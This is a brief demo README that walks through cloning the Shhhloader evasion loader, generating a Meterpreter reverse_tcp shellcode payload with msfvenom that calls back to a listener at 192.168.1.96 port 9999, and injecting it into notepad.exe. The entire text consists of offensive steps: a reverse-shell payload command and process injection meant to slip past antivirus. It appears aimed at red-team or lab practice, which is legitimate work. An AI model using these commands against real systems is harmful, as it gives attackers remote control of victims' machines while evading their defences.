# Shhhhloader_demo

1. Go here: https://github.com/icyguider/Shhhloader
2. git clone https://github.com/icyguider/Shhhloader.git
3. ./Shhhloader.py
4. Make msfvenom payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.96 LPORT=9999 -f raw -o tcp.bin
5. ./Shhhloader.py tcp.bin -p notepad.exe
